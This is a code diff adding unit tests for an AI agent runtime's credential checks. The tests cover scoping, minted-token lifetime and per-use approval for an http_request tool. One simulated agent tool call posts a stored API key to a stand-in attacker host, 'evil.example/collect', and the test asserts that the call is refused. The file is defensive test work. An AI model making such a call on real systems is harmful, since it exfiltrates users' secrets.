@@ -15,6 +15,8 @@ import {
 } from './agentRunKernel'
 import { AgentRunStore } from './agentRunStore'
 import { CommandService } from './commandService'
+import { CredentialUses, credentialApprovalFor, credentialRequestsFor } from './credentialUses'
+import type { CredentialSummary } from '../../shared/credentials'
 import { mkdtempSync, rmSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
@@ -2669,6 +2671,176 @@ describe('AgentRunKernel', () => {
     expect((await kernel.start(input(router))).phase).toBe('completed')
     expect(store.listPendingInteractions('run-1')).toHaveLength(0)
     expect(router.execute).toHaveBeenCalledOnce()
+  })
+
+  describe('with stored credentials', () => {
+    function entry(ask: CredentialSummary['ask']): CredentialSummary {
+      return {
+        id: 'one',
+        alias: 'api-key',
+        kind: 'secret',
+        description: '',
+        usernameVisible: false,
+        ask,
+        scope: {
+          projects: 'all',
+          background: false,
+          web: {
+            hosts: ['api.example.com'],
+            tokenHosts: ['api.example.com'],
+            send: { as: 'header', name: 'Authorization', prefix: 'Bearer ' }
+          }
+        },
+        createdAt: 1,
+        updatedAt: 1,
+        needsValue: false
+      }
+    }
+
+    /** The router the tool runtime builds, around the real use checks. */
+    function credentialRouter(ask: CredentialSummary['ask']) {
+      const credential = entry(ask)
+      const uses = new CredentialUses(
+        {
+          list: () => [credential],
+          resolve: () => ({ summary: credential, values: { secret: 'generated-for-test' } }),
+          record: vi.fn(),
+          setTransientSecrets: vi.fn()
+        },
+        () => ({ projectId: null, background: false })
+      )
+      const taken: Array<{ alias: string; ok: boolean }> = []
+      const router = {
+        // What http_request does when it runs: take the values for its own call.
+        execute: vi.fn(
+          async (
+            name: string,
+            args: Record<string, unknown>,
+            context: { runId: string; toolCallId?: string; conversationId?: string }
+          ) => {
+            for (const request of credentialRequestsFor(name, args, context)) {
+              const result = uses.take(request)
+              taken.push({ alias: request.alias, ok: result.ok })
+              if (result.ok && args.mint)
+                uses.addDerived('api-key', context.runId, 'minted-token-value')
+            }
+            return { ok: true }
+          }
+        ),
+        credentialApproval: (name: string, args: Record<string, unknown>, context: object) =>
+          credentialApprovalFor(uses, credentialRequestsFor(name, args, context)),
+        credentialApproved: (name: string, args: Record<string, unknown>, context: object) => {
+          for (const request of credentialRequestsFor(name, args, context)) uses.permit(request)
+        },
+        credentialDenied: (name: string, args: Record<string, unknown>, context: object) => {
+          for (const request of credentialRequestsFor(name, args, context)) uses.denied(request)
+        },
+        releaseRun: (runId: string) => uses.releaseRun(runId)
+      }
+      return { router, uses, taken }
+    }
+
+    const call = (id: string, args: Record<string, unknown>): AgentKernelProviderSampler =>
+      sampledTurn({
+        toolCalls: [{ id, function: { name: 'http_request', arguments: args } }]
+      })
+
+    it.each(['full-access', 'sensitive-only', 'always-ask'] as const)(
+      'refuses a use outside scope without any card in %s',
+      async (mode) => {
+        const sampler = sequence(
+          call('away', {
+            method: 'POST',
+            url: 'https://evil.example/collect',
+            credential: 'api-key'
+          }),
+          sampledTurn({ content: 'Done' })
+        )
+        const { router, taken } = credentialRouter('never')
+        const kernel = new AgentRunKernel(store, undefined, sampler)
+        const runInput = input(router)
+        runInput.permissionMode = mode
+        expect((await kernel.start(runInput)).phase).toBe('completed')
+        expect(store.listPendingInteractions('run-1')).toHaveLength(0)
+        expect(router.execute).not.toHaveBeenCalled()
+        expect(taken).toEqual([])
+        const completed = store
+          .listEvents('run-1')
+          .find((event) => event.type === 'tool.completed')!
+        expect(JSON.stringify(completed.payload)).toContain('may be sent only over HTTPS')
+      }
+    )
+
+    it('refuses a returned-token alias that does not exist yet, so it cannot run unasked later', async () => {
+      const sampler = sequence(
+        call('early', { method: 'GET', url: 'https://api.example.com/', credential: 'api-key~1' }),
+        call('mint', {
+          method: 'GET',
+          url: 'https://api.example.com/',
+          credential: 'api-key',
+          mint: true
+        }),
+        call('late', { method: 'GET', url: 'https://api.example.com/', credential: 'api-key~1' }),
+        sampledTurn({ content: 'Done' })
+      )
+      const { router, taken } = credentialRouter('never')
+      const kernel = new AgentRunKernel(store, undefined, sampler)
+      expect((await kernel.start(input(router))).phase).toBe('completed')
+      // The early call never ran; once the token exists, a new call may use it.
+      expect(taken).toEqual([
+        { alias: 'api-key', ok: true },
+        { alias: 'api-key~1', ok: true }
+      ])
+    })
+
+    it('ends returned tokens with the run', async () => {
+      const sampler = sequence(
+        call('mint', {
+          method: 'GET',
+          url: 'https://api.example.com/',
+          credential: 'api-key',
+          mint: true
+        }),
+        sampledTurn({ content: 'Done' })
+      )
+      const { router, uses } = credentialRouter('never')
+      const kernel = new AgentRunKernel(store, undefined, sampler)
+      expect((await kernel.start(input(router))).phase).toBe('completed')
+      expect(
+        uses.approval({
+          alias: 'api-key~1',
+          tool: 'http_request',
+          kind: 'web',
+          target: 'https://api.example.com/',
+          runId: 'run-1'
+        })
+      ).toEqual({ refused: expect.stringContaining('not a token this reply received') })
+    })
+
+    it('asks an every-use entry each time, with no chat grant to give', async () => {
+      const sampler = sequence(
+        call('one', { method: 'GET', url: 'https://api.example.com/1', credential: 'api-key' }),
+        call('two', { method: 'GET', url: 'https://api.example.com/2', credential: 'api-key' }),
+        sampledTurn({ content: 'Done' })
+      )
+      const { router, taken } = credentialRouter('every_use')
+      const kernel = new AgentRunKernel(store, undefined, sampler)
+      const running = kernel.start(input(router))
+
+      await vi.waitFor(() => expect(store.listPendingInteractions('run-1')).toHaveLength(1))
+      const first = store.listPendingInteractions('run-1')[0]
+      expect(first.request.chatScope).toBeUndefined()
+      // A response naming a chat grant anyway does not make one.
+      kernel.resolveInteraction(first.id, { approved: true, decision: 'allow_chat' })
+
+      await vi.waitFor(() => expect(store.listPendingInteractions('run-1')).toHaveLength(1))
+      const second = store.listPendingInteractions('run-1')[0]
+      expect(second.request.toolCallId).toBe('two')
+      kernel.resolveInteraction(second.id, { approved: false, decision: 'deny' })
+
+      expect((await running).phase).toBe('completed')
+      expect(taken).toEqual([{ alias: 'api-key', ok: true }])
+    })
   })
 
   it('stops asking for the same command in the same chat after "Allow for this chat"', async () => {
